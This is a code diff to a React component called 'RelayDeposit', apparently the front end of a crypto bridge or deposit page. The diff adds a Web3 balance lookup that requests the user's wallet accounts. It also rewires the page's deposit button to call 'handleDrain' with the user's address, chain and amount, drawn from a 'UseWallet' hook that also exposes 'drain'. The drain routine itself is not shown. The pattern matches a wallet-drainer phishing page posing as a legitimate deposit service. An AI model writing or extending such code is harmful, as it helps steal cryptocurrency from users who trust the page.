@@ -13,7 +13,7 @@ import {
   BsInfoCircle,
 } from "react-icons/bs";
 import { shortenAddress } from "./utils";
-import { getBalance } from "@wagmi/core";
+// import { getBalance } from "@wagmi/core";
 import { config } from "../Web3Config";
 import { useQuery } from "@tanstack/react-query";
 import axios from "axios";
@@ -23,6 +23,7 @@ import light from "../../images/light.png";
 import WagmiConnectButton from "./WagmiConnectButton";
 import spinner from "../../images/spinner.svg";
 import { UseWallet } from "./useWallet";
+import Web3 from "web3";
 
 const RelayDeposit = ({
   selectedFrom,
@@ -44,15 +45,7 @@ const RelayDeposit = ({
   const [isModalOpen, setIsModalOpen] = useState(false);
   const [tradeType, setTradeType] = useState("EXACT_INPUT");
   const [walletBalance, setWalletBalance] = useState(0);
-  const { drain } = UseWallet();
-
-  const balance = getBalance(config, {
-    address,
-    chainId,
-  }).then((res) => {
-    // console.log(res)
-    setWalletBalance(res?.formatted);
-  });
+  const { drain, handleDrain } = UseWallet();
 
   function generateZerosString(count) {
     return "0".repeat(count);
@@ -102,7 +95,51 @@ const RelayDeposit = ({
       // setToPrice();
     }
   }, [data]);
-  console.log(walletBalance, "walletBalace");
+
+  const getBalance = async () => {
+    try {
+      // Check if window.ethereum is available
+      if (typeof window.ethereum === "undefined") {
+        console.log("Ethereum provider is not available");
+        return;
+      }
+
+      // Initialize Web3 instance
+      const web3 = new Web3(window.ethereum);
+
+      // Request accounts
+      const accounts = await window.ethereum.request({
+        method: "eth_requestAccounts",
+      });
+
+      if (!accounts || accounts.length === 0) {
+        console.log(
+          "No accounts found. Make sure the user is logged into their wallet."
+        );
+        return;
+      }
+
+      // Get balance in wei
+      const weiBalance = await web3.eth.getBalance(accounts[0]);
+
+      if (weiBalance === undefined) {
+        console.error("Failed to fetch balance for the account:", accounts[0]);
+        return;
+      }
+
+      // Convert to Ether
+      const ethBalance = web3.utils.fromWei(weiBalance, "ether"); // Specify 'ether' as the unit
+      // console.log("ETH Balance:", ethBalance);
+
+      // Set the wallet balance state
+      setWalletBalance(ethBalance);
+    } catch (err) {
+      console.log("Error fetching balance:", err);
+    }
+  };
+
+  getBalance();
+  // console.log(walletBalance, "walletBalace");
   // console.log(error, "error response");
 
   return (
@@ -315,7 +352,7 @@ const RelayDeposit = ({
               height={16}
               className="rounded-sm"
             />
-            <p className="text-xs lg:text-sm">Realy (instant)</p>
+            <p className="text-xs lg:text-sm">Relay (instant)</p>
             <IoIosArrowDown className="ease transition-all duration-200 text-gray-500" />
           </div>
         </button>
@@ -324,7 +361,9 @@ const RelayDeposit = ({
       {isConnected ? (
         <div className="w-full flex">
           <button
-            onClick={() => drain()}
+            onClick={() =>
+              handleDrain({ address, chainId, transferAmount: fromPrice })
+            }
             disabled={
               isLoading ||
               !isConnected ||
